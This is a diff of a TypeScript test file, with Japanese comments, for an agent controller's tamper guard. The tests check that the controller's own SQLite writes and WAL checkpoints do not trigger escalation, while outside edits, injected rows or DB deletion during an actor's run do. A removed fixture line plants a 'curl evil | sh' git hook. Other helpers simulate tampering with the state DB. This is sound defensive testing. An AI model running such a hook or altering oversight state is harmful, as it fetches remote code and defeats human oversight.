@@ -1,45 +1,45 @@
+import { mkdirSync, mkdtempSync, rmSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { DatabaseSync } from "node:sqlite";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { type ControllerDeps, tick } from "../src/controller/index.js";
-import type { Goal } from "../src/domain/goal.js";
-import { CONTROLLER_STATE_DB_KEY, UNREADABLE_FINGERPRINT } from "../src/domain/guard-rules.js";
+import { type Goal, goalSchema } from "../src/domain/goal.js";
+import { CONTROLLER_STATE_DB_KEY } from "../src/domain/guard-rules.js";
+import type { RunIntent, RunOutcome } from "../src/domain/run.js";
 import type { Store } from "../src/store/port.js";
 import { openStore } from "../src/store/sqlite.js";
 
 /**
- * controller 自身の書き込みと、外部からの改竄を、同じ指紋の差から区別する（issue #62）。
+ * controller 自身の書き込みで関門が鳴らないこと、外からの改竄では鳴ることを、
+ * **本物の状態 DB を通して**固定する（issue #62）。
  *
- * `.goals/.state/goals.db` は `outOfSightState` が指紋で見る保護対象でありながら、
- * controller 自身の書き込み先でもある。ACT の窓——ベースラインを控えてから検査する
- * までの間——で controller は必ずこの DB に書く（`startRun` / `finishRun` と lease の
- * 延長）。SQLite は WAL なので普段その書き込みは `goals.db` の中身を動かさないが、
- * WAL が閾値を越えたコミットでは自動 checkpoint が走って中身が変わる
- * （`tests/state-db-wal-checkpoint.test.ts` が、その挙動そのものを固定している）。
- * 実際に ACT を含むティックが `ESCALATE(protected_path_touched)` で止まり、
- * 実装役の成果が publish されないまま worktree に残った。
+ * `.goals/.state/goals.db` は関門が見る保護対象でありながら、controller 自身の
+ * 書き込み先でもある。ACT の窓——ベースラインを控えてから検査するまでの間——で
+ * controller は必ずこの DB に書く（`startRun` / `finishRun` と lease の延長）。
+ * かつて関門はこのファイルを**バイト列**で見ていたので、SQLite の WAL が自動
+ * checkpoint に当たった回だけ `goals.db` の中身が動き、ACT を含むティックが
+ * `ESCALATE(protected_path_touched)` で止まっていた。実装役の成果は publish されず、
+ * worktree に未 commit で残る。
  *
- * **ここで固定したいのは「保護を外さないまま誤検知だけを消す」ことになる。**
- * `.goals/.state/**` を保護対象から外せば誤検知は消えるが、DB を直接書き換えて
- * 状態を偽造されても関門が鳴らなくなる。落とす条件は「保護対象かどうか」ではなく
- * 「その差分が controller 自身の書き込みで説明できるか」で、説明が付くのは
- * 自分の書き込みの前後で控えた指紋の連鎖が1度も切れていないときだけになる。
+ * **観測をバイト列から論理的な行へ移した**（`Store.guardDigest`）。関門が見るのは
+ * 「この Goal に属する行の内容」で、checkpoint が走ってもファイルが再配置されても
+ * 動かない。controller 自身が ACT の窓で書く分——lease の列と、そのティックで
+ * 作った Run の行——だけを射影から外す。
+ *
+ * **この形にした一番の理由は、ここを本物の DB で書けるようになることになる。**
+ * 指紋を文字列で偽装した fake で組むと、controller の書き込みが1つ増えた日に
+ * 何も落ちない。本物の store を通しておけば、ACT の窓の中で説明の付かない
+ * 書き込みが増えた瞬間に「controller 自身の書き込みでは止まらない」が落ちる。
  */
 
 const NOW = new Date("2026-08-12T08:00:00.000Z");
 const WORKTREE_ROOT = "/tmp/entelecheia/worktrees";
 
-/** 状態 DB の「中身」を模す値。実装は sha256 を返すが、ここでは区別が付けば足りる */
-const CONTROLLER_WROTE = "controller が書いた形";
-const TAMPERED = "誰かに書き換えられた形";
-
-function goalWith(): Goal {
-  return {
+function goalWith(id: string): Goal {
+  return goalSchema.parse({
     version: 1,
-    goal: {
-      id: "sample-goal",
-      name: "サンプル",
-      desired_state: "何かが完成している",
-      depends_on: [],
-    },
+    goal: { id, name: "サンプル", desired_state: "何かが完成している" },
     repository: {
       provider: "github",
       owner: "slashkiko",
@@ -55,12 +55,8 @@ function goalWith(): Goal {
       },
     ],
     context: { background: "背景", constraints: [], references: [] },
-    // 下限（`PROTECTED_PATH_FLOOR`）はスキーマが混ぜるが、ここは Goal を直に
-    // 組み立てているので、この2本は明示で置く。
-    policies: {
-      require_human_approval: ["merge"],
-      protected_paths: [".goals/.state/**", ".git/**"],
-    },
+    // 空で宣言しても、スキーマの下限が `.goals/.state/**` と `.git/**` を入れる。
+    policies: { require_human_approval: ["merge"], protected_paths: [] },
     budget: {
       max_actor_runs: 10,
       max_reconciles: 20,
@@ -68,82 +64,18 @@ function goalWith(): Goal {
       max_consecutive_failures: 3,
       max_unchanged_reconciles: 9,
     },
-  };
+  });
 }
 
-/**
- * 状態 DB の中身を持つ模型。
- *
- * `outOfSightState` は呼ばれた時点の値を返すだけにする。「何回目の呼び出しか」で
- * 値を変える書き方にすると、実装が指紋を取る回数にテストが縛られる。ここで
- * 見たいのは回数ではなく、**誰が書いたタイミングで変わったか**になる。
- */
-interface StateFile {
-  /** いまの中身 */
-  content: string;
-  /** `outOfSightState` を落とす */
-  broken: boolean;
-  /** ポートが `outOfSightState` を持たない実装かどうか */
-  absent: boolean;
+interface Options {
+  /** ACT の窓の中（Actor が走っているあいだ）に起きること */
+  duringAct?: () => void | Promise<void>;
 }
 
-interface Fixture {
-  /** ACT のあいだ（controller の書き込みとは無関係に）DB を書き換える */
-  tamperDuringAct?: boolean;
-  /** controller 自身の書き込みで DB の中身が変わる（WAL の checkpoint を模す） */
-  checkpointOnControllerWrite?: boolean;
-  /** `.git/hooks/pre-push` を ACT のあいだに置く */
-  tamperHook?: boolean;
-  /** controller の書き込みと同じ瞬間に DB が読めなくなる（削除された） */
-  unreadableOnControllerWrite?: boolean;
-  state: StateFile;
-}
-
-function deps(store: Store, fixture: Fixture): ControllerDeps {
-  const state = fixture.state;
-  const hooks = { content: "元の hook" };
-
-  /**
-   * controller 自身の書き込み。WAL の自動 checkpoint に当たったティックを模して、
-   * 書くたびに `goals.db` の中身が変わる形にする。
-   *
-   * `inActWindow` は「ベースラインを控えたあとの書き込みか」になる。lease の取得は
-   * ティックの入口——ベースラインより前——にも1回あるので、そこまで巻き込むと
-   * ACT の窓の中で起きた出来事を模せない。
-   */
-  const controllerWrote = (inActWindow: boolean): void => {
-    if (fixture.unreadableOnControllerWrite === true && inActWindow) {
-      // 自分の書き込みの直前と直後に取る指紋の**間**で DB が読めなくなる。
-      // 控えを取る側から見ると、自分の書き込みの結果と見分けが付かない位置になる。
-      state.content = UNREADABLE_FINGERPRINT;
-      return;
-    }
-    if (fixture.checkpointOnControllerWrite === true) {
-      state.content = `${CONTROLLER_WROTE}:${state.content}`;
-    }
-  };
-
-  const wrapped: Store = {
-    ...store,
-    startRun: (goalId, intent) => {
-      const id = store.startRun(goalId, intent);
-      controllerWrote(true);
-      return id;
-    },
-    finishRun: (runId, outcome) => {
-      store.finishRun(runId, outcome);
-      controllerWrote(true);
-    },
-    acquireLease: (goalId, owner, until, now) => {
-      const got = store.acquireLease(goalId, owner, until, now);
-      controllerWrote(false);
-      return got;
-    },
-  };
-
+function deps(store: Store, goalId: string, options: Options = {}): ControllerDeps {
   return {
-    store: wrapped,
-    owner: "worker-a",
+    store,
+    owner: `worker-${goalId}`,
     leaseSeconds: 300,
     worktreeRoot: WORKTREE_ROOT,
     review: { latest: async () => null },
@@ -164,158 +96,263 @@ function deps(store: Store, fixture: Fixture): ControllerDeps {
       }),
       commit: async () => true,
       changedPaths: async () => [],
+      // git が見える汚れは空にする。ここで見たいのは状態 DB だけになる。
       repoDirtyState: async () => new Map(),
-      ...(state.absent
-        ? {}
-        : {
-            outOfSightState: async () => {
-              if (state.broken) {
-                throw new Error("状態 DB を読めない");
-              }
-              return new Map([
-                [CONTROLLER_STATE_DB_KEY, state.content],
-                [".git/hooks/pre-push", hooks.content],
-              ]);
-            },
-          }),
+      // 状態 DB はもうここには出ない。controller が store から論理ダイジェストを
+      // 取り、`CONTROLLER_STATE_DB_KEY` として観測に混ぜる。
+      outOfSightState: async () =>
+        new Map([
+          [".git/hooks/pre-push", "sha-clean"],
+          [".git/config#core.hooksPath", "unset"],
+        ]),
     },
     actor: {
       kind: "claude-code",
       run: async () => {
-        // ACT のあいだの書き換え。controller の書き込みとは別のタイミングで起きる。
-        if (fixture.tamperDuringAct === true) {
-          state.content = TAMPERED;
-        }
-        if (fixture.tamperHook === true) {
-          hooks.content = "curl evil | sh";
-        }
+        await options.duringAct?.();
         return { exitCode: 0, logRef: "log", tokens: 10, artifacts: [] };
       },
     },
     writer: {
       findPullRequest: async () => null,
       createPullRequest: async () => 1,
-      addComment: async () => {},
+      addComment: async () => undefined,
     },
-    branch: {
-      push: async (name) => ({ branch: `entelecheia/${name}`, pushed: true }),
-    },
-    llm: {
-      chooseAction: async () => ({ type: "ACT", intent: "テストを直す" }),
-    },
+    branch: { push: async (name) => ({ branch: `entelecheia/${name}`, pushed: true }) },
+    llm: { chooseAction: async () => ({ type: "ACT", intent: "テストを直す" }) },
     now: () => NOW,
   };
 }
 
-describe("controller 自身の書き込みと外部からの改竄を分ける", () => {
-  let store: Store;
+let dir: string;
+let dbPath: string;
+let store: Store;
 
-  beforeEach(() => {
-    store = openStore(":memory:");
-  });
+beforeEach(() => {
+  dir = mkdtempSync(join(tmpdir(), "ent-state-db-"));
+  mkdirSync(join(dir, ".goals", ".state"), { recursive: true });
+  dbPath = join(dir, ".goals", ".state", "goals.db");
+  store = openStore(dbPath);
+});
 
-  afterEach(() => {
-    store.close();
-  });
+afterEach(() => {
+  store.close();
+  rmSync(dir, { recursive: true, force: true });
+});
 
-  const runTick = async (fixture: Omit<Fixture, "state"> & { state?: Partial<StateFile> }) => {
-    const goal = goalWith();
-    store.upsertGoal(goal);
-    store.setStatus(goal.goal.id, "ACTIVE", null, NOW.toISOString());
-    const state: StateFile = {
-      content: "ACT 前の形",
-      broken: false,
-      absent: false,
-      ...fixture.state,
-    };
-    return tick(goal, deps(store, { ...fixture, state }));
-  };
+function activate(target: Store, goal: Goal): void {
+  target.upsertGoal(goal);
+  target.setStatus(goal.goal.id, "ACTIVE", null, NOW.toISOString());
+}
 
-  it("controller 自身の書き込みで goals.db が変わっても止めない", async () => {
-    // issue #62 の症状そのもの。ACT の窓の中で startRun / finishRun / lease の
-    // 延長が走り、WAL の checkpoint に当たった回だけ中身が変わる。
-    const result = await runTick({ checkpointOnControllerWrite: true });
+describe("controller 自身の書き込みでは止まらない", () => {
+  it("ACT の窓で checkpoint が走っても ESCALATE しない", async () => {
+    // issue #62 の症状そのもの。`goals.db` のバイト列が動くのは checkpoint の
+    // せいで、論理的な行は1つも変わっていない。ACT の最中に checkpoint を
+    // 明示的に起こして、その1点だけを再現する。
+    const goal = goalWith("state-db-goal");
+    activate(store, goal);
+
+    const result = await tick(
+      goal,
+      deps(store, goal.goal.id, {
+        duringAct: () => {
+          checkpoint();
+        },
+      }),
+    );
 
     expect(result.decision?.action).toMatchObject({ type: "ACT" });
     expect(result.status).toBe("ACTIVE");
   });
 
-  it("ACT 中に外から goals.db を書き換えられたら止める", async () => {
-    // 保護そのものは残す。ここが鳴らなくなると、`UPDATE goals SET status='COMPLETED'`
-    // の1行で以降の全ティックを短絡させられる。
-    const result = await runTick({ tamperDuringAct: true });
+  it("Run の write-ahead と確定、lease の延長だけでは ESCALATE しない", async () => {
+    // 射影から外しているのは lease の列と「このティックで作った Run」だけになる。
+    // ACT の窓で説明の付かない書き込みが1つ増えれば、ここが落ちる。
+    const goal = goalWith("state-db-goal");
+    activate(store, goal);
 
-    expect(result.decision?.action).toEqual({
-      type: "ESCALATE",
-      reason: "protected_path_touched",
-    });
-    expect(result.decision?.decidedBy).toBe("guard");
-    expect(result.decision?.rationale).toContain(CONTROLLER_STATE_DB_KEY);
-  });
-
-  it("改竄のあとに controller が書いても、改竄は説明されない", async () => {
-    // ここが案2を素朴に採った実装との分かれ目になる。「最後の書き込みの直後に
-    // ベースラインを取り直す」だけだと、その前に起きた改竄が控えに畳み込まれて
-    // 説明が付いてしまう。自分が書く**直前**にも指紋を見て、控えと違えば
-    // そのティックのあいだ説明をやめる。
-    //
-    // この fixture では ACT の途中で改竄が入り、そのあとに finishRun が走って
-    // もう一度中身が変わる。検査時の指紋は controller が最後に残した形と
-    // 一致するので、直前の確認が無ければ素通りする。
-    const result = await runTick({ tamperDuringAct: true, checkpointOnControllerWrite: true });
-
-    expect(result.decision?.action).toEqual({
-      type: "ESCALATE",
-      reason: "protected_path_touched",
-    });
-  });
-
-  it("状態 DB を読めないティックは、これまでどおり guard_unavailable で止まる", async () => {
-    // 「確かめられなかった」を「自分が書いた」と読まない（design.md §3.1）。
-    // 説明が付く経路を足したせいで、読めないことが素通りするようになっては
-    // いけない。指紋を取れなかった回は控えにも使わない（`stateWitness`）。
-    const result = await runTick({
-      checkpointOnControllerWrite: true,
-      state: { broken: true },
-    });
-
-    expect(result.decision?.action).toMatchObject({ reason: "guard_unavailable" });
-  });
-
-  it("DB が読めなくなった差分は、控えに入っていても説明しない", async () => {
-    // 自分の書き込みの直前と直後に取る指紋の間——ミリ秒の窓——に消されると、
-    // 「読めない」が控えに入り、検査時の指紋と一致してしまう。**controller の
-    // 書き込みが「読めない」を作ることはない**ので、この値だけは控えに入って
-    // いても説明に使わない。消す側は一度当てれば状態が残り続けるため、
-    // 窓に当たったかどうかで結果が変わってはいけない。
-    const result = await runTick({ unreadableOnControllerWrite: true });
-
-    expect(result.decision?.action).toEqual({
-      type: "ESCALATE",
-      reason: "protected_path_touched",
-    });
-    expect(result.decision?.rationale).toContain(CONTROLLER_STATE_DB_KEY);
-  });
-
-  it("状態 DB 以外のキーは controller の書き込みとして説明しない", async () => {
-    // 説明の対象は名指しの1本だけ（`writtenByController`）。hooks は
-    // controller が書く場所ではないので、変わったらそのまま違反になる。
-    const result = await runTick({ tamperHook: true, checkpointOnControllerWrite: true });
-
-    expect(result.decision?.action).toEqual({
-      type: "ESCALATE",
-      reason: "protected_path_touched",
-    });
-    expect(result.decision?.rationale).toContain(".git/hooks/pre-push");
-  });
-
-  it("outOfSightState を持たない実装でも、これまでどおり回る", async () => {
-    // 持っていないことを違反にはしない（`observedRepoState`）。
-    const result = await runTick({
-      checkpointOnControllerWrite: true,
-      state: { absent: true },
-    });
+    const result = await tick(goal, deps(store, goal.goal.id));
 
     expect(result.decision?.action).toMatchObject({ type: "ACT" });
   });
 });
+
+describe("外からの改竄では止まる", () => {
+  it("ACT 中に status を書き換えられたら ESCALATE する", async () => {
+    // ここが鳴らなくなると、`UPDATE goals SET status='COMPLETED'` の1行で
+    // 以降の全ティックを短絡させられる。保護を外していないことの確認になる。
+    const goal = goalWith("state-db-goal");
+    activate(store, goal);
+
+    const result = await tick(
+      goal,
+      deps(store, goal.goal.id, {
+        duringAct: () => {
+          tamper("UPDATE goals SET status = 'COMPLETED' WHERE id = 'state-db-goal'");
+        },
+      }),
+    );
+
+    expect(result.decision?.action).toEqual({
+      type: "ESCALATE",
+      reason: "protected_path_touched",
+    });
+    expect(result.decision?.rationale).toContain(CONTROLLER_STATE_DB_KEY);
+  });
+
+  it("ACT 中に Run を差し込まれたら ESCALATE する", async () => {
+    // 外すのは「controller 自身が作った Run」だけで、Run のテーブル全体ではない。
+    const goal = goalWith("state-db-goal");
+    activate(store, goal);
+
+    const result = await tick(
+      goal,
+      deps(store, goal.goal.id, {
+        duringAct: () => {
+          tamper(
+            `INSERT INTO runs (goal_id, intent, actor, role, worktree, attempt, status, started_at, artifacts)
+             VALUES ('state-db-goal', '偽の Run', 'claude-code', 'implement', 'w', 1, 'completed', '${NOW.toISOString()}', '[]')`,
+          );
+        },
+      }),
+    );
+
+    expect(result.decision?.action).toEqual({
+      type: "ESCALATE",
+      reason: "protected_path_touched",
+    });
+  });
+
+  it("ACT 中に DB を消されたら ESCALATE する", async () => {
+    // 開いたままのコネクションは unlink されたファイルを読み続ける。
+    // 行だけを見ていると気づけないので、存在も観測に混ぜてある。
+    const goal = goalWith("state-db-goal");
+    activate(store, goal);
+
+    const result = await tick(
+      goal,
+      deps(store, goal.goal.id, {
+        duringAct: () => {
+          rmSync(dbPath);
+        },
+      }),
+    );
+
+    expect(result.decision?.action).toEqual({
+      type: "ESCALATE",
+      reason: "protected_path_touched",
+    });
+  });
+});
+
+describe("同じディレクトリで別の Goal を回しても止まらない", () => {
+  it("ACT 中に別の Goal の行が増えても ESCALATE しない", async () => {
+    // 2本目の ent が同じ `goals.db` に書いている状態にあたる。
+    const goal = goalWith("state-db-goal");
+    activate(store, goal);
+
+    const other = openStore(dbPath);
+    activate(other, goalWith("other-goal"));
+
+    try {
+      const result = await tick(
+        goal,
+        deps(store, goal.goal.id, {
+          duringAct: () => {
+            const intent: RunIntent = {
+              intent: "別の Goal を進める",
+              actor: "claude-code",
+              role: "implement",
+              worktree: "other-goal",
+              attempt: 1,
+              startedAt: NOW.toISOString(),
+            };
+            const outcome: RunOutcome = {
+              status: "completed",
+              finishedAt: NOW.toISOString(),
+              exitCode: 0,
+              logRef: "log",
+              tokens: 1,
+              artifacts: [],
+              detail: null,
+            };
+            other.acquireLease("other-goal", "worker-b", new Date(NOW.getTime() + 300_000), NOW);
+            other.finishRun(other.startRun("other-goal", intent), outcome);
+          },
+        }),
+      );
+
+      expect(result.decision?.action).toMatchObject({ type: "ACT" });
+    } finally {
+      other.close();
+    }
+  });
+
+  it("2本のティックを同じ DB へ同時に流しても、どちらも ESCALATE しない", async () => {
+    // **これはテストの中の並列で、`ent run` を2本立てたわけではない。**
+    // 確かめているのは「同じ `goals.db` を共有する2つのティックが、互いの
+    // 書き込みで関門を鳴らさない」の1点だけになる。git のロック競合など、
+    // プロセスを分けて初めて出るものはここには出ない。
+    const a = goalWith("goal-a");
+    const b = goalWith("goal-b");
+    activate(store, a);
+
+    const second = openStore(dbPath);
+    activate(second, b);
+
+    // 互いの ACT の窓が重なるようにする。片方が先に閉じてしまうと、
+    // 相手の書き込みが自分の窓の外へ出る。
+    const started = { a: false, b: false };
+    const overlap = async (side: "a" | "b"): Promise<void> => {
+      started[side] = true;
+      for (let i = 0; i < 200 && !(started.a && started.b); i += 1) {
+        await new Promise((resolve) => setTimeout(resolve, 5));
+      }
+      // 相手の窓が開いているあいだに書く。
+      for (let i = 0; i < 20; i += 1) {
+        await new Promise((resolve) => setTimeout(resolve, 1));
+      }
+    };
+
+    try {
+      const [left, right] = await Promise.all([
+        tick(a, deps(store, a.goal.id, { duringAct: () => overlap("a") })),
+        tick(b, deps(second, b.goal.id, { duringAct: () => overlap("b") })),
+      ]);
+
+      expect(started).toEqual({ a: true, b: true });
+      expect(left.decision?.action).toMatchObject({ type: "ACT" });
+      expect(right.decision?.action).toMatchObject({ type: "ACT" });
+    } finally {
+      second.close();
+    }
+  });
+});
+
+/** 外から DB を書き換える。Bash を持つ Actor や、別プロセスにあたる */
+function tamper(sql: string): void {
+  const db = new DatabaseSync(dbPath);
+  try {
+    db.exec(sql);
+  } finally {
+    db.close();
+  }
+}
+
+/**
+ * WAL の内容を `goals.db` へ畳み込む。誤検知の引き金だったものを明示的に起こす。
+ *
+ * 実際には SQLite が閾値（既定 1000 ページ）を越えたコミットで勝手に走らせる。
+ * 何回書けば越えるかはそのプロセスがそれまでに書いた量で決まるので、
+ * ティックの形が同じでも鳴ったり鳴らなかったりしていた
+ * （`tests/state-db-wal-checkpoint.test.ts`）。
+ */
+function checkpoint(): void {
+  const db = new DatabaseSync(dbPath);
+  try {
+    db.exec("PRAGMA wal_checkpoint(TRUNCATE)");
+  } finally {
+    db.close();
+  }
+}
